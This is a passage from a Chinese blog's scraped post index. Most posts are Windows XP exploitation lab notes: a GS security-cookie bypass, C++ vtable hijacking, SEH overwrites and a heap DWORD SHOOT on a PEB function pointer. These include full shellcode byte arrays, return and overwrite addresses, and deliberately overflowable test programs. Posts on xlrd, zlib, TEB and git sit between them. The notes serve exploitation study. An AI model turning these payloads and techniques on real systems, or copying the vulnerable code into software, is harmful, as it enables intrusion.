test函数对s+i到s+i+3的内存进行赋值，虽然函数对i进行了上限判断，但是没有判断i是否大于0，当i为负值时，s+i所指向的空间就会脱离main中申请的空间，进而有可能会指向.data区域 test函数中的strcpy存在典型的溢出漏洞 实验环境 推荐使用环境 备注 操作系统 Windows XP SP3 编译器 Visual Studio 2008 编译选项 禁用优化选项 build版本 release版本 Security Cookie校验过程： shellcode赋值为8*&quot;\\x90&quot;，然后使用OllyDbg加载 运行程序，并中断在test函数中的if语句处，此实验中该语句地址0x00401013 如下图所示，程序从0x0040300C(security_cookie)处取出Cookie值，然后与EBP做一次异或，最后将异或之后的值放到EBP-4的位置作为次函数的Security Cookie。函数返回前的校验过程就是此过程的逆过程：程序从EBP-4的位置取出值，然后与EBP异或，最后与0x0040300C(security_cookie)处的Cookie进行比较，如果两者一致则校验通过，否则转入校验失败的异常处理。由于__security_cookie会随着实验而进行改变，所以此处可能会改变。在后面的实验中发现，这个地方的值为0x004030DC，所以得读者自己进行测试 实验关键点就是在0x004030DC处写入我们的数据，而我们在main函数中通过malloc申请的空间起始位置是0x00410048将程序中断在malloc之后，call MALLOC之后，函数会将申请的空间起始地址保存在EAX并返回。这个位置相对于0x00403000处于高址位置，可以通过向test函数中i参数传递一个负值来将指针str向0x00403000方向移动，通过计算得到i应设置为0xffff3094(-53100)就可以将str指向0x004030DC。 将程序重新编译后，在strcpy处中断。此时0x004030DC被覆盖为0x90909090。将0x90909090与当前EBP异或的结果放到Security Cookie位置即可。此时异或的结果为0x90826FF4。 调试发现dest起始位置为0x0012FE94，Security Cookie位于0x0012FF60，返回地址位于0x0012FF68. shellcode组成： &quot;\\x90\\x90\\x90\\x90&quot;修改.data中Cookie + 168字节弹出对话框 + 32*&quot;\\x90&quot; + &quot;\\xF4\\x6F\\x82\\x90&quot;Security Cookie + &quot;\\x90\\x90\\x90\\x90\\x94\\xFE\\x12\\x00&quot; 填充和返回地址覆盖","tags":[{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"},{"name":"GS","slug":"GS","permalink":"http://yoursite.com/tags/GS/"}]},{"title":"详解python中xlrd包的安装与处理Excel表格","date":"2017-07-03T02:18:20.000Z","path":"2017/07/03/详解python中xlrd包的安装与处理Excel表格/","text":"1. 安装xlrd pip install xlrd 2. python处理excel表格2.1 打开excel表格 # -*- coding: utf-8 -*- import xlrd # 获取一个Book对象 book = xlrd.open_workbook(\"1.xls\") # 获取一个sheet对象的列表 sheets = book.sheets() # 遍历每一个sheet，输出这个sheet的名字（如果是新建的一个xls表，可能是sheet1、sheet2、sheet3） for sheet in sheets: print(sheet.name) open_workbook(): 打开工作簿，这就打开了Excel表。 返回的是一个Book对象，通过Book对象我们可以获得一个Sheet的列表，上面的程序就简单地把每个sheet的名字都输了出来。 2.2 读出指定单元格内的数据 # -*- coding: utf-8 -*- import xlrd # 获取一个Book对象 book = xlrd.open_workbook(\"1.xls\") # 获取一个sheet对象的列表 sheets = book.sheets() # 遍历每一个sheet，输出这个sheet的名字（如果是新建的一个xls表，可能是sheet1、sheet2、sheet3） for sheet in sheets: print(sheet.cell_value(0, 0)) 读出单元格内数据函数 cell_value(row, col) ，行列均从0起。 除此之外，可以通过： sheet.cell(row, col) # 获取单元格对象sheet.cell_type(row, col) # 获取单元格类型 2.3 读取日期数据 # -*- coding: utf-8 -*- from datetime import datetime from xlrd import xldate_as_tuple # 获取一个Book对象 book = xlrd.open_workbook(\"1.xls\") # 获取一个sheet对象的列表 sheets = book.sheets() timeVal = sheets[0].cell_value(0,0) timestamp = datetime(*xldate_as_tuple(timestamp, 0)) print(timestamp) 如果Excel存储的某一个单元格数据是日期的话，需要进行一下处理，转换为datetime类型 2.4 遍历每行的数据 rows = sheet.get_rows() for row in rows: print(row[0].value) # 输出此行第一列的数据","tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"excel","slug":"excel","permalink":"http://yoursite.com/tags/excel/"}]},{"title":"python用模块zlib压缩与解压字符串和文件的方法","date":"2017-07-02T09:20:22.000Z","path":"2017/07/02/python用模块zlib压缩与解压字符串和文件的方法/","text":"python中zlib模块是用来压缩或者解压缩数据，以便保存和传输。它是其他压缩工具的基础。下面来一起看看python用模块zlib压缩与解压字符串和文件的方法。话不多说，直接来看示例代码。 1. 压缩与解压字符串 import zlib message = 'abcd1234' compressed = zlib.compress(message) decompressed = zlib.decompress(compressed) print 'original:', repr(message) print 'compressed:', repr(compressed) print 'decompressed:', repr(decompressed) 结果 original: 'abcd1234' compressed: 'x\\x9cKLJN1426\\x01\\x00\\x0b\\xf8\\x02U' decompressed: 'abcd1234' 2. 压缩与解压文件 import zlib def compress(infile, dst, level=9): infile = open(infile, 'rb') dst = open(dst, 'wb') compress = zlib.compressobj(level) data = infile.read(1024) while data: dst.write(compress.compress(data)) data = infile.read(1024) dst.write(compress.flush()) def decompress(infile, dst): infile = open(infile, 'rb') dst = open(dst, 'wb') decompress = zlib.decompressobj() data = infile.read(1024) while data: dst.write(decompress.decompress(data)) data = infile.read(1024) dst.write(decompress.flush()) if __name__ == \"__main__\": compress('in.txt', 'out.txt') decompress('out.txt', 'out_decompress.txt') 3. 问题——处理对象过大异常 >>> import zlib >>> a = '123' >>> b = zlib.compress(a) >>> b 'x\\x9c342\\x06\\x00\\x01-\\x00\\x97' >>> a = 'a' * 1024 * 1024 * 1024 * 10 >>> b = zlib.compress(a) Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt; OverflowError: size does not fit in an int","tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"zlib","slug":"zlib","permalink":"http://yoursite.com/tags/zlib/"}]},{"title":"攻击C++的虚函数","date":"2017-07-01T10:23:16.000Z","path":"2017/07/01/攻击C-的虚函数/","text":"C++简介理解虚函数和虚表 C++类的成员函数声明时，若使用关键字virtual进行修饰，则被称为虚函数 一个类中可能有多个虚函数 虚函数的入口地址统一保存在虚表(Vtable)之中 对象在使用虚函数时，首先通过虚表指针找到虚表，然后从虚表中取出最终的函数入口地址进行调用 虚表指针保存在对象的内存空间中，紧接着虚表指针的是其他成员变量 虚函数只有通过对象指针的引用才能显示其动态调用的特性。 C++虚函数的利用实验代码： #include \"windows.h\" #include \"iostream.h\" char shellcode[] = \"\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\" \"\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\" \"\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\" \"\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\" \"\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\" \"\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\" \"\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\" \"\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\" \"\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\" \"\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\" \"\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x50\\xAE\\x42\\x00\"; // set fake virtual function pointer class Failwest { public: char buf[200]; virtual void test(void) { cout&lt;&lt;\"Class Vtable::test()\"&lt;&lt;endl; }; }; Failwest overflow, *p; void main(void) { char *p_vtable; p_vtable = overflow.buf - 4; //point to virtual table // reset fake virtual table to 0x004088cc // the address mat need to ajusted via runtime debug __asm int 3; p_vtable[0] = 0x00; p_vtable[1] = 0xAF; p_vtable[2] = 0x42; p_vtable[3] = 0x00; strcpy(overflow.buf, shellcode); // set fake virtual function pointer p = &overflow; p->test(); } C++虚函数利用原理图： 首先需要知道的是： idata: 明显是一个Imports函数的代码段，这里集中所有外部函数地址，代码中会先跳到该地址后再执行，PE文件加载器在开始会获取真实的函数地址来修补idata段中的函数地址。 data: 这个段存放程序的全局数据、全局常量等。 rdata: 名字上看就是资源数据段，程序用到什么资源数据都在这里，资源包括你自己封包的，也包括开发工具自动封包的。 所以我们应该在data段中找到自己需要的实验的全局变量 局部变量在栈中 得到shellcode起始地址：0x0042AE50shellcode结束地址：0x0042AF00 实验结果","tags":[{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"},{"name":"c++","slug":"c","permalink":"http://yoursite.com/tags/c/"}]},{"title":"TEB简介","date":"2017-06-30T13:16:57.000Z","path":"2017/06/30/TEB简介/","text":"TEB特点 一个进程可能同时有多个线程 每个线程都有一个线程环境块TEB 第一个TEB开始于0x7FFDE000 之后新建的线程的TEB将紧随前边的TEB，之间相隔0x100字节，并向内存地址方向 线程退出时，对应的TEB也被销毁，腾出的TEB空间被新建的线程重复使用。 线程环境块的预测图： TEB结构由于TEB才是初学，对里面的很多结构都不怎么了解，写这一节主要是为了贴一张图，方便以后补充！ 当然为了充实被本篇博客，笔者提供几个小程序： 从FS寄存器获取当前线程 int GetThreadId() { int ithread = 0; _asm{ xor esi , esi mov eax, fs:[esi+18h] mov ecx, [eax+ 20h] mov eax, [eax+ 24h] mov dword ptr[ithread], eax } return ithread; } 从FS寄存器获取当前进程ID int GetProcessId() { int iProcess = 0; _asm{ xor esi , esi mov eax, fs:[esi+18h] mov ecx, [eax+ 20h] mov eax, [eax+ 24h] mov dword ptr[iProcess ], ecx } return iProcess; }","tags":[{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"},{"name":"TEB","slug":"TEB","permalink":"http://yoursite.com/tags/TEB/"}]},{"title":"使用git在github上创建新工程","date":"2017-06-30T06:29:17.000Z","path":"2017/06/30/使用git在github上创建新工程/","text":"这段时间进经常会忘记如何在github上同步工程，于是又得查资料，查参考书，浪费了很长时间，因此有了感触，写几篇有关此类问题的篇章！ 这是老手新手都十分容易犯的错误，就是在创建一个新github项目或者以本地已有项目为原型重新创建一个github项目时，容易创建一个空文件夹就直接关联远程仓库，这样做只会返回错误！！！所以，文件夹一定不能为空...... 创建新工程需要的命令完成本地项目与git的关联 cd 工程目录 git init //初始化本地仓库，当前目录下会出现一个名为 .git 的目录 git add . //将所有文件添加到缓存区，告诉 Git 开始对这些文件进行跟踪 git commit -am \"Hello\" //提交文件到本地仓库 完成远程项目的创建在github上创建某个项目，然后可以拷贝处该项目的地址 关联远程仓库（github上创建的地址） git remote add origin https://github.com/Introspelliam/Hello.git //关联远程仓库 push本地项目到远程仓库 git push origin master //push项目到master Username for 'https://github.com': //你的github账户名称 github上提供的工程创建方法…or create a new repository on the command line echo &quot;# ctf-challenges&quot; &gt;&gt; README.md git init git add README.md git commit -m &quot;first commit&quot; git remote add origin https://github.com/Introspelliam/ctf-challenges.git git push -u origin master …or push an existing repository from the command line git remote add origin https://github.com/Introspelliam/ctf-challenges.git git push -u origin master","tags":[{"name":"git","slug":"git","permalink":"http://yoursite.com/tags/git/"}]},{"title":"windows 异常处理中的漏洞利用","date":"2017-06-29T12:21:31.000Z","path":"2017/06/29/windows-异常处理中的漏洞利用/","text":"1. S.E.H概述SEH即异常处理结构体(Structure Exception Handler)，其中包含两个DWORD指针：SEH链表指针和异常处理函数句柄。 几个要点： SEH结构体放在系统栈中 当线程初始化时，会自动向栈中安装一个SEH，作为线程默认的异常处理 如果程序源代码中使用try{}except{}或者Assert宏等异常处理机制，编译器将最终将通过向当前函数栈帧中安装一个SEH来实现异常处理 栈中一般会同时存在多个SEH 栈中的多个SEH通过链表指针在栈内由栈顶向栈底串成单项链表，位于链表最顶端的SEH通过TEB(线程环境块)0字节偏移处的指针标识 当异常发生时，操作系统会中断程序，并首先从TEB的0字节偏移处取出距离栈顶最近的SEH，使用异常处理函数句柄所指向的代码来处理异常。 当离“事故现场”最近的异常处理函数运行失效时，将顺着SEH链表依次尝试其他的异常处理函数 如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数。通过这个函数弹出一个对话框，然后强制关闭程序。 利用SEH的原理： SEH放在栈内，可以缓冲区淹没SEH 精心制造溢出数据可以把SEH中异常处理函数的入口地址更改为shellcode的起始地址 溢出后错误的栈帧或堆块数据往往会触发异常 在Windows开始处理溢出的异常时，会错误地把shellcode当作异常处理函数而执行 2. 栈溢出中利用SEH2.1 获取shellcode起始地址和SEH地址测试代码 #include #include char shellcode[] = \"\\x90\\x90\\x90\\x90\"; DWORD MyExceptionhandler(void) { printf(\"got an exception, press Enter to kill process!\\n\"); getchar(); ExitProcess(1); return 1; } void test(char *input) { char buf[200]; int zero = 0; __asm int 3; // used to break process for debug __try { strcpy(buf, input); // overrun the stack zero = 4/zero; // generate an exception } __except(MyExceptionhandler()){} } void main() { test(shellcode); } 根据Ollydbg得到结论 shellcode起始位置为0x0012FE48离栈顶栈顶最近的SEH链表指针地址为0x0012FF18，其异常处理函数句柄地址为0x0012FF1Cshellcode起始地址与异常处理句柄地址之间共有212个字节间隙，也就是说，超出缓冲区8字节后的部分将覆盖SEH链的第一个SEH：由于SEH链表指针为0x90909090，所以为无效地址，系统为默认其为最终的异常处理；而而处理函数句柄内的地址是shellcode起始地址，那么就会跳转至此进行函数执行。 2.2 编写shellcode char shellcode[] = \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\" \"\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\" \"\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\" \"\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\" \"\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\" \"\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\" \"\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\" \"\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\" \"\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\" \"\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\" \"\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x48\\xFE\\x12\\x00\"; 注意在执行的时候去掉__asm int 3调试 3. 堆溢出中利用SEH #include &lt;windows.h&gt; char shellcode[] = \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\" \"\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\" \"\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\" \"\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\" \"\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\" \"\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\" \"\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\" \"\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\" \"\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\" \"\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\" \"\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00\" // heap of the ajacent free block(尾块) \"\\x88\\x06\\x36\\x00\" //0x00360688 is the address of shellcode in first Heapblock \"\\x90\\x90\\x90\\x90\"; //target of DWORD SHOOT DWORD MyExceptionhandler(void) { ExitProcess(1); return 0; } int main() { HLOCAL h1=0, h2=0; HANDLE hp; hp = HeapCreate(0, 0x1000, 0x10000); h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200); memcpy(h1, shellcode, 0x200); // overflow here // noticed 0x200 means 512 __asm int 3 // used to break the process __try { h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); } __except(MyExceptionhandler()){} return 0; } 实验方案： 溢出第一个堆块的数据将写入后面的空闲堆块，第二次分配的时候发生DWORD SHOOT。 将SEH的异常回调函数地址作为DWORD SHOOT目标，将其替换为shellcode入口地址，异常发生后，操作系统将错误地把shellcode当作异常处理函数而执行。 得到的DWORD的目标地址后，就可以去掉中断指令，更改DWORD SHOOT的目标地址，重新执行 遗憾的是，该实验我做了很多次，最后都是无功而返，没有试验现象，到目前为止不知道原因！！！！ 4. Windows异常处理4.1 不同级别的SEH异常处理流程： 首先执行线程中距离栈顶最近的SEH异常处理函数 若失败，则依次尝试执行SEH链表中的后续异常处理函数 若SEH链中所有的异常处理函数都没能处理异常，则执行进程中的异常处理 若仍然失败，系统默认的异常处理函数将被调用，程序崩溃窗口将被弹出 4.2 线程的异常处理线程中用于处理异常的回调函数有4参数： pExcept：指向非常重要的结构体EXCEPTION_RECORD。该结构体包含若干与异常相关的信息，如异常的类型、异常发生的地址等 pFrame：指向栈帧中SEH结构体 pContext：指向Context结构体。该结构体中包含所有寄存器的状态 pDispatch：位置用途 返回值：0（ExceptionContinueExecution）：异常被成功处理，将返回原程序发生异常的地方，继续执行后续指令。1（ExceptionContinueSearch）：代表异常处理失败，将顺着SEH链表搜索其他可用于异常处理的函数并尝试处理。 异常处理函数的第一轮调用用来尝试处理异常，而第二轮的unwind调用时，往往执行的是释放资源等操作。 4.3 进程的异常处理如果异常没被线程的异常处理函数或调试器处理掉，将交给进程中的异常处理函数。 通过API函数SetUnhandledExceptionFilter来注册，其是kernel32.dll的导出函数。 提示：把线程异常处理对应代码中try{}except(){}或者Assert等语句，把进程的异常处理对应于函数SetUnhandledExceptionFilter 返回值： 1(EXCEPTION_EXECUTE_HANDLER):表示错误得到正确的处理，程序将退出 0(EXCEPTION_CONTINUE_SEARCH):无法处理错误，将错误转交给系统默认的异常处理 -1(EXCEPTION_CONTINUE_EXECUTION):表示错误得到正确处理，并将继续执行下去。类似于线程的异常处理函数，系统会用回调函数会付出异常发生时的断点状况。但这时引起异常的寄存器应该已经得到了恢复。 4.4 系统默认异常处理UEF如果进程异常处理失败或用户根本没有注册进程异常处理，系统默认的异常处理函数UnhandledExceptionFilter()将被调用。 4.5 异常处理流程总结 CPU执行发生并捕获异常，内核结果进程的控制权，开始内核态的异常处理 内核异常处理结束，将控制权还给ring3 ring3中第一个处理异常的函数是ntdll.dll中的KiUserExceptionDispatcher()函数 KiUserExceptionDispatcher()首先会检查程序是否处于调试状态。如果程序正被调试，会将异常交给调试器进行处理 在非调试状态下，KiUserExceptionDispatcher()调用RtlDispatchException()函数对线程的SEH链表进行遍历，如果找到能够处理异常的回调函数，将再次遍历先前调用过的SEH句柄，即unwind操作，以保证异常处理机制自身的完整性 如果栈中所有的SEH都失败了，且用户曾经使用过SetUnhandledExceptionFilter()函数设定进程异常处理，则这个异常处理将被调用。 如果用户自定义的进程异常处理失败，或者用户根本没有定义进程异常处理，那么系统默认的异常处理UnhandledExceptionFilter()将被调用。UEF会根据注册表里的相关信息决定是默默关闭程序，还是弹出错误对话框 5. 其他异常处理机制的利用思路5.1 VEH利用VEH（Vectored Exception Handler，向量化异常处理） VEH和进程异常处理类似，都是基于进程的，而且需要使用API注册回调函数 可注册多个VEH。VEH结构体之间串成双向链表，因此比SEH多了一个前向指针 VEH处理优先级次于调试器处理，高于SEH处理。先KiUserExceptionDispatcher，再VEH，最后SEH VEH保存在堆中 unwind操作只对栈帧中的SEH链起作用，不会涉及VEH这种进程类的异常处理 Windows heap overfows如果能利用堆溢出的DWORD SHOOT修改VEH头结点指针，在异常处理开始后，并能引导程序去执行shellcode 5.2 攻击TEB中的SEH头节点异常发生时，异常处理机制会遍历SEH链表中寻找合适的出错函数。线程SEH链通过TEB的第一个DWORD标识(fs:0)，这个指针永远指向离栈顶最近的那个SEH。如果能够修改TEB中的这个指针，在异常发生时就能将程序引导到shellcode中去执行 Third Generation Exploition 5.3 攻击UEF如果能通过DWORD SHOOT把这个处理函数覆盖为shellcode的入口地址，再制造一个其他异常处理无法解决的异常，那么系统将使用UEF作为最后一根救命稻草来解决异常时，shellcode就被执行。 5.4 攻击PEB中的函数指针前面博客有讲","tags":[{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"}]},{"title":"堆溢出利用（下）—— 代码植入","date":"2017-06-26T07:10:53.000Z","path":"2017/06/26/堆溢出利用（下）——-代码植入/","text":"1 DWORD SHOOT的利用方法堆溢出更加精确，往往直接狙击重要目标。精准是DWORD SHOOT的优点，但是“火力不足”有时也会限制堆溢出的利用，这样就需要选择最重要的目标来“狙击”。 本节将介绍内存中常用的“狙击目标”，然后以修改PEB（进程环境块）中的同步函数指针为例，给出完整利用堆溢出执行shellcode的例子。 DWORD SHOOT的常用目标(Windows XP SP1之前的平台)大概可概括为以下几类： 内存变量：修改能够影响程序执行的重要标志变量，往往可以改变程序流程。如：更改身份验证函数的返回值就可以通过认证机构。 代码逻辑：修改代码段重要函数的关键逻辑有时候可以达到一定攻击效果。如：程序分支处的判断逻辑，或者把身份验证函数的调用指令覆盖为0x90(nop)。这种方法虽然类似于软件破解技术中的“爆破”——通过更改一个字节而改变整个程序的流程。 函数返回地址：栈溢出通过修改函数返回地址能够劫持进程，堆溢出也一样能够利用DWORD SHOOT更改函数返回地址。但是由于栈帧移位的原因，函数返回地址往往是不固定的，甚至在同一操作系统和补丁版本下连续运行两次栈状态都会有不同，故DWORD SHOOT在这种情况下有局限，靶子不好瞄准。 攻击异常处理机制：当程序产生异常时，Windows会转入异常处理机制。堆溢出很容易引起异常，因此异常处理机制所使用重要数据结构往往会成为DWORD SHOOT的上等目标，这包括S.E.H（structure exception handler）、F.V.E.H（First Vectored Exception Handler）、进程环境块(P.E.B)中的U.E.F(Unhandled Exception Filter)、线程环境块(T.E.B)中存放的第一个S.E.H指针(T.E.H)。 函数指针：系统优势会使用函数指针呢。比如动态链接库中的函数、C++中的虚函数调用等。改写这些函数指针后，在函数调用发生后往往可以成功地劫持进程。 P.E.B中线程同步函数的入口地址：PEB存放着一对同步函数指针，指向RtlEnterCriticalSection()和RtlLeaveCriticalSection()，并且进程退出时会被ExitProcess()调用。如果能够通过DWORD SHOOT修改这对指针中的一个，那么就能在程序退出时ExitProcess()将会被骗去调用我们的shellcode。由于PEB的位置始终不会变化，这对指针在PEB中的偏移也始终不变，这使得利用堆溢出开发适用于不同操作系统版本和补丁版本的exploit成为可能。这是Windows平台下堆溢出利用的最经典方法之一。 2 狙击PEB中的RtlEnterCriticalSection()的函数指针windows为了同步进程下的多个线程，使用了同步措施，如锁措施(lock)、信号量(semaphore)、临界区(critical section)等。当进程退出时，ExitProcess()函数要用到临界区函数RtlEnterCriticalSection和RtlLeaveCriticalSection()来同步线程防止脏数据的产生。 通过进程环境块PEB偏移0x20处存放函数指针来间接完成调用临界区函数。具体就是0x7FFDF020处存放指向RtlEnterCriticalSection()的指针，在0x7FFDF024处存指向RtlLeaveCriticalSection()的指针。 从Windows 2003 Server开始修改这部分的实现。 2.1 实验代码如下#include &lt;windows.h&gt; char shellcode[] = &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90...&quot;; main() { HLOCAL h1=0, h2=0; HANDLE hp; hp = HeapCreate(0, 0x1000, 0x10000); h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200); __asm int 3 //used to break process memcpy(h1, shellcode, 0x200); //overflow, 0x200=512 h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); return 0; } 2.2 实验步骤 h1向堆中申请200字节的空间 memcpy的上限错误地写成了0x200，这实际上是512字节，会产生溢出 h1分配完之后，后面紧跟一个大空闲块（尾块） 超过200字节的数据将覆盖尾块块首 用伪造的指针覆盖尾块块首中的 空表指针，当h2分配时，将导致DWORD_SHOOT DWORD SHOOT的目标是0x7FFDF020处的RtlEnterCriticalSection()函数指针，可以简单地将其修改为shellcode位置 DWORD_SHOOT完毕后，堆溢出导致异常，最终导致调用ExitProcess()结束进程 ExitProcess()在结束进程时需要调用临界区函数来同步线程，但却从PEB中拿出了指针指向shellcode的指针，因此shellcode被执行 2.3 实验细节当实验中shellcode为200字节0x90，执行到0x00401085,也就是memcpy函数结束，堆中状态如下图所示（不知道是什么原因，无论shellcode多大，最后使用memcpy(h1, shellcode, 0x200)之后，都会使尾块不见！！！尾块一般的flag标志位0x10）： 当然这并不重要，重要的是这里面仍然有堆溢出。缓冲区的布置如下：(1) 将那段168字节的shellcode用0x90补充为200字节。(2) 紧随其后，附上8字节的块首信息。为了防止在DWORD SHOOT发生之前产生异常，不放直接将块首从内存中复制使用&quot;\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00&quot;(3) 前向指针是DWORD SHOOT的子弹，这里直接使用shellcode的起始地址0x00360688.(4) 后向指针是DWORD SHOOT的“目标”，这里填入PEB的函数指针地址0x7FFDF020. 如果缓冲区内容如下: char shellcode[] = \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" // MessageBoxA with tile \"failwest\" and context \"failwest\" \"\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\" \"\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\" \"\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\" \"\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\" \"\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\" \"\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\" \"\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\" \"\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\" \"\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\" \"\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\" \"\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00\" // head of the ajacent free block \"\\x88\\x06\\x36\\x00\\x20\\xf0\\xfd\\x7f\"; // 0x00360688 is the address of shellcode in first heap block // you have to make sure this address via debug // 0x7ffdf020 is the position in the PEB which hold a pointer to // RtlEnterCriticalSection() and will called by ExitProcess() at last 